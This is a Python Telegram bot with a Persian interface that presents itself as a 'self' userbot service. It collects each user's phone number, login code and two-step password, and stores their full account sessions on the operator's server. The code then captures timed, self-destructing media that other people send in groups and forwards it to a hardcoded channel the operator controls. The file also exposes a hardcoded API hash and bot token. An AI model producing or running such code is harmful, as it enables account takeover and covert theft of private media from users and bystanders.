from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError
import random
import hashlib
import os
import time
import json
import asyncio
from aiohttp import web
import glob

API_ID = 26123074
API_HASH = 'e54093aa586de25491a6d9394fd55534'
BOT_TOKEN = '8940705403:AAHW9N_6lEDbL6LXy79KX_SEt-XphYDtp_Y'

TARGET_CHANNEL = -1004418089041

bot = TelegramClient('star_bot_panel', API_ID, API_HASH)

DB_FILE = 'database.json'
user_clients = {}

# دیکشنری موقت برای مدیریت آلبوم‌های چندتایی #
media_albums = {}

def load_database():
    data = {}
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                loaded = json.load(f)
                data = {int(k): v for k, v in loaded.items()}
        except Exception:
            data = {}
    return data

def save_database():
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(database, f, ensure_ascii=False, indent=4)

database = load_database()

def main_menu_inline():
    return [
        [Button.inline("➕ ایجاد ربات", b"menu_add")],
        [Button.inline("👤 حساب کاربری", b"menu_account")],
        [Button.inline("📜 قوانین", b"menu_rules")]
    ]

def management_menu():
    return [
        [Button.inline("⭕ وضعیت فعالیت", b"status")],
        [Button.inline("🗑 حذف ربات", b"delete")],
        [Button.inline("🔄 ريستارت ربات", b"restart")],
        [Button.inline("🔙 بازگشت به منوی اصلی", b"back")]
    ]

@bot.on(events.NewMessage(pattern='/start'))
async def start_cmd(event):
    await event.respond(
        "سلام! برای مدیریت یا ایجاد سلف، از دکمه‌های زیر استفاده کنید:",
        buttons=main_menu_inline()
    )

@bot.on(events.NewMessage(func=lambda e: e.is_private))
async def handle_text(event):
    text = event.text.strip()
    chat_id = event.chat_id

    if text.startswith('/'):
        return

    if text == "لغو ❌":
        database.pop(chat_id, None)
        save_database()
        await event.respond("عملیات لغو شد.", buttons=main_menu_inline())
        return

    if chat_id not in database:
        return

    user_data = database[chat_id]
    step = user_data.get("step")

    if step == "waiting_phone":
        phone = text.replace(" ", "")
        user_data["phone"] = phone
        user_data["step"] = "waiting_code"
        save_database()
        await event.respond("⏳ در حال ارسال کد ورود سریع به حساب...")
        try:
            client = TelegramClient(f"session_{chat_id}", API_ID, API_HASH)
            user_data["client"] = client
            await client.connect()
            sent = await client.send_code_request(phone)
            user_data["phone_code_hash"] = sent.phone_code_hash
            save_database()
            await event.respond("✅ کد تایید تلگرام برای شما ارسال شد. لطفاً آن را وارد کنید:")
        except Exception as e:
            await event.respond(f"❌ خطا در ارسال کد:\n{str(e)}")
            database.pop(chat_id, None)
            save_database()

    elif step == "waiting_code":
        client = user_data.get("client")
        phone = user_data.get("phone")
        phone_code_hash = user_data.get("phone_code_hash")

        if not client:
            client = TelegramClient(f"session_{chat_id}", API_ID, API_HASH)
            await client.connect()

        clean_code = text.replace(" ", "")
        try:
            await client.sign_in(phone=phone, code=clean_code, phone_code_hash=phone_code_hash)
            await finish_login(event, chat_id, client)
        except SessionPasswordNeededError:
            database[chat_id]["step"] = "waiting_password"
            database[chat_id]["client"] = client
            save_database()
            await event.respond("🔒 این حساب دارای رمز دوم (تایید دو مرحله‌ای) است. لطفاً رمز عبور خود را وارد کنید:")
        except Exception as e:
            await event.respond(f"❌ کد اشتباه است یا منقضی شده. لطفاً دوباره وارد کنید:\n{str(e)}")
            database.pop(chat_id, None)
            save_database()

    elif step == "waiting_password":
        client = user_data.get("client")
        try:
            await client.sign_in(password=text)
            await finish_login(event, chat_id, client)
        except Exception as e:
            await event.respond(f"❌ رمز اشتباه است:\n{str(e)}")

async def finish_login(event, chat_id, client):
    database[chat_id] = {"step": "active", "active": True}
    save_database()
    user_clients[chat_id] = client
    await start_user_client(chat_id, client)
    await event.respond("🎉 سلف شما با موفقیت روشن شد و به سیستم متصل گردید!", buttons=management_menu())

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    data = event.data.decode('utf-8')
    chat_id = event.chat_id

    if data == "menu_add":
        if chat_id in database and database[chat_id].get("active"):
            await event.edit("شما یک سلف فعال دارید!", buttons=management_menu())
        else:
            database[chat_id] = {"step": "waiting_phone"}
            save_database()
            await event.edit("لطفاً شماره تلفن اکانت خود را با پیش‌شماره (مثلاً 989123456789+) ارسال کنید:")
    elif data == "menu_account":
        if chat_id in database and database[chat_id].get("active"):
            await event.edit("حساب شما متصل و فعال است.", buttons=management_menu())
        else:
            await event.edit("حساب فعالی ندارید.", buttons=main_menu_inline())
    elif data == "menu_rules":
        await event.edit("📜 قوانین استفاده:\nاز این سلف برای موارد غیرقانونی استفاده نکنید.", buttons=main_menu_inline())
    elif data == "status":
        await event.edit("⭕ وضعیت: روشن و پایدار", buttons=management_menu())
    elif data == "delete":
        database.pop(chat_id, None)
        save_database()
        if chat_id in user_clients:
            try:
                await user_clients[chat_id].disconnect()
            except:
                pass
            user_clients.pop(chat_id, None)
        session_file = f"session_{chat_id}.session"
        if os.path.exists(session_file):
            try:
                os.remove(session_file)
            except:
                pass
        await event.edit("🗑 ربات و سلف شما با موفقیت حذف شد.", buttons=main_menu_inline())
    elif data == "restart":
        await event.edit("🔄 سلف مجدداً راه‌اندازی شد.", buttons=management_menu())
    elif data == "back":
        await event.edit("به منوی اصلی برگشتید:", buttons=main_menu_inline())

async def start_user_client(chat_id, client):
    @client.on(events.NewMessage(incoming=True))
    async def media_handler(event):
        if event.is_private or event.out:
            return

        if not event.media:
            return

        # فیلتر: فقط رسانه‌های تایم‌دار و مخفی اجازه عبور دارند
        ttl_seconds = getattr(event.message, 'ttl_period', None)
        if not ttl_seconds:
            return

        group_id = getattr(event.message, 'grouped_id', None)

        if group_id:
            if group_id not in media_albums:
                media_albums[group_id] = []
            media_albums[group_id].append(event.media)
            await asyncio.sleep(1.5)
            if group_id in media_albums:
                media_list = media_albums.pop(group_id)
                try:
                    await event.client.send_file(TARGET_CHANNEL, media_list, caption="📸 شکار آلبوم تایم‌دار!")
                except Exception as err:
                    print(f"خطا در ارسال آلبوم: {err}")
            return

        video_duration = None
        is_video_note = False
        if hasattr(event.media, 'document') and event.media.document:
            for attr in event.media.document.attributes:
                if type(attr).__name__ == 'DocumentAttributeVideo':
                    video_duration = getattr(attr, 'duration', None)
                    if getattr(attr, 'round_message', False):
                        is_video_note = True

        file_path = await event.download_media()
        if not file_path:
            return

        caption_text = "📸 شکار رسانه تایم‌دار / ویدیو!"
        if ttl_seconds:
            caption_text += f"\n⏱ تایم مخفی بودن: {ttl_seconds} ثانیه"
        if video_duration:
            caption_text += f"\n⏳ زمان ویدیو: {video_duration} ثانیه"
        if is_video_note:
            caption_text = "📹 شکار ویدیومسیج گرد (Video Note)!"

        try:
            if is_video_note:
                await client.send_file(TARGET_CHANNEL, file_path, video_note=True, caption=caption_text)
            else:
                await client.send_file(TARGET_CHANNEL, file_path, caption=caption_text)
        except Exception as e:
            print(f"خطا در ارسال فایل: {e}")

        if os.path.exists(file_path):
            os.remove(file_path)

async def restore_sessions():
    """بازیابی خودکار سلف‌ها بعد از روشن شدن مجدد ربات"""
    for chat_id, data in database.items():
        if data.get("active"):
            session_file = f"session_{chat_id}.session"
            if os.path.exists(session_file) or os.path.exists(f"session_{chat_id}"):
                try:
                    client = TelegramClient(f"session_{chat_id}", API_ID, API_HASH)
                    await client.connect()
                    if await client.is_user_authorized():
                        user_clients[chat_id] = client
                        asyncio.create_task(start_user_client(chat_id, client))
                        print(f"سلف کاربر {chat_id} با موفقیت مجدداً متصل شد.")
                    else:
                        database[chat_id]["active"] = False
                        save_database()
                except Exception as e:
                    print(f"خطا در اتصال مجدد سلف {chat_id}: {e}")

async def main():
    print("Bot is running...")
    await bot.start(bot_token=BOT_TOKEN)
    
    # اتصال خودکار سلف‌های قبلی
    await restore_sessions()
    
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
